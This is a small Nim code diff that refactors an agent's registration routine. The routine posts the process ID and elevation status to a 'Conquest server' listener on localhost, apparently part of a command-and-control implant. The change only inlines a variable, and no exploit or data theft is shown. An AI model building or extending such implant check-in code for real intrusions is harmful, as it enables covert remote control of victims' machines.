@@ -20,13 +20,11 @@ proc register*(listener: string): string =
         "pid":  getProcessId(),
         "elevated": isElevated()
     }
-
     echo $body
 
     try:
         # Register agent to the Conquest server
-        let responseBody = waitFor client.postContent(fmt"http://localhost:5555/{listener}/register", $body)
-        return responseBody
+        return waitFor client.postContent(fmt"http://localhost:5555/{listener}/register", $body)
     except HttpRequestError as err:
         echo "Registration failed"
         quit(0)
